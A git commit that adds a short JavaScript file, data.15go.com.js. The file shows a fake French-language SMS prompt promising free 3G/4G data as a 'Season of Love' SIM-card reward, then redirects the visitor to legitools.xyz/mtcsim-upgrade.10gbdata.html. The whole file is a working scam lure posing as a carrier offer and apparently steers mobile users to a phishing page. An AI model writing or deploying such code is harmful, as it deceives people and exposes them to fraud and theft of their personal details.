71533fc020736644daaf62a234bb2f96424f1321
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-08 09:19:08 -0800

    Create data.15go.com.js

---
+++ data.15go.com.js
@@ -0,0 +1,5 @@
+var password = 'Données gratuites'
+password=prompt('SMS: Season of Love Votre numéro est éligible pour recevoir des données gratuites RÉCOMPENSE DE CARTE SIM 3G ou 4G, veuillez appuyer sur OK pour ACTIVER. ','Données gratuites');
+if (password != 'Données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
